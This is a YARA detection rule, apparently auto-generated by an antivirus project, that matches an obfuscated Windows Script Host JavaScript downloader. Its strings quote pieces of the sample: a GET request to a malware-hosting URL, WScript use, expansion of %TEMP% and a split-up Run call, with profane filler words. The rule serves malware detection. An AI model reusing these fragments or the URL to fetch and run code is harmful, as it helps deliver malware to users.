rule sig_20160428_d7e35f2039e179bdc7751a3a9a9b9f9d {
  meta:
    description = "datamaliciousorder - file 20160428_d7e35f2039e179bdc7751a3a9a9b9f9d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bd3c67bd6b524bdab477c91b66fc8ed6b522a06a28f85830929b23b17e770036"

  strings:
    $s1  = "YlqAdzVutRsoZojYcsUtg[CxnYkqWjgEzwZmeBpgXms](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function ForZdkCynQlySgmDxmAoo(SzeDfaGjoTvpXgxGrnRqk){VxfTxpXbiDwmXwuQgqRhj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function EwtGcvMujPaaPytFwxEcx() {return VxfTxpXbiDwmXwuQgqRhj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function ForZdkCynQlySgmDxmAoo(SzeDfaGjoTvpXgxGrnRqk){VxfTxpXbiDwmXwuQgqRhj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function KroQdzVomEacBecNqxCtg(PbwRpxQzzJixFmoEtlCyg, XwtBryJayOmjEjiZxfZaa){TkqHaxJdpAygToxIlxBmf = TkqHaxJdpAygToxIlxBmf * 1; " ascii
    $s6  = "return PbwRpxQzzJixFmoEtlCyg - XwtBryJayOmjEjiZxfZaa;};" fullword ascii
    $s7  = "var VxfTxpXbiDwmXwuQgqRhj = function CnpDbbPghKsnPzwJwcFjl() {return HysOekKqiBwuUzsMyuZqw[OrdDdtMnqKqcSpgEcfJwn](\"WScript\"+\"" ascii
    $s8  = "var VxfTxpXbiDwmXwuQgqRhj = function CnpDbbPghKsnPzwJwcFjl() {return HysOekKqiBwuUzsMyuZqw[OrdDdtMnqKqcSpgEcfJwn](\"WScript\"+\"" ascii
    $s9  = "var HysOekKqiBwuUzsMyuZqw = this[\"WScript\"];" fullword ascii
    $s10 = "function EwtGcvMujPaaPytFwxEcx() {return VxfTxpXbiDwmXwuQgqRhj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function LhcJlrAzdIwqUeoOivSgo(){return FeeAdgEpsHdlPvbIjnFke + \"\";};" fullword ascii
    $s12 = "function KroQdzVomEacBecNqxCtg(PbwRpxQzzJixFmoEtlCyg, XwtBryJayOmjEjiZxfZaa){TkqHaxJdpAygToxIlxBmf = TkqHaxJdpAygToxIlxBmf * 1; " ascii
    $s13 = "if (YlqAdzVutRsoZojYcsUtg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function PluGrgLtfQqeHndAovFib() {return ((FbfEowXnzQfvZexOteKzg == true) && (FbfEowXnzQfvZexOteKzg == NwrVwcLraSxcTxsYbfZbg)) ?" ascii
    $s15 = "function PluGrgLtfQqeHndAovFib() {return ((FbfEowXnzQfvZexOteKzg == true) && (FbfEowXnzQfvZexOteKzg == NwrVwcLraSxcTxsYbfZbg)) ?" ascii
    $s16 = "var EitZkkAvxVpuXcpUqnFta = false;" fullword ascii
    $s17 = "var DxeLtaAorZawMqlGghMro = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "FbfEowXnzQfvZexOteKzg = true; " fullword ascii
    $s19 = "EitZkkAvxVpuXcpUqnFta = true;" fullword ascii
    $s20 = "return KroQdzVomEacBecNqxCtg(1 == 1 ? ZogBbuHyxGyxEgwRhgAqi : 0, 1 == 1 ? PcpApkZdoYfcDwmPzpDta : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}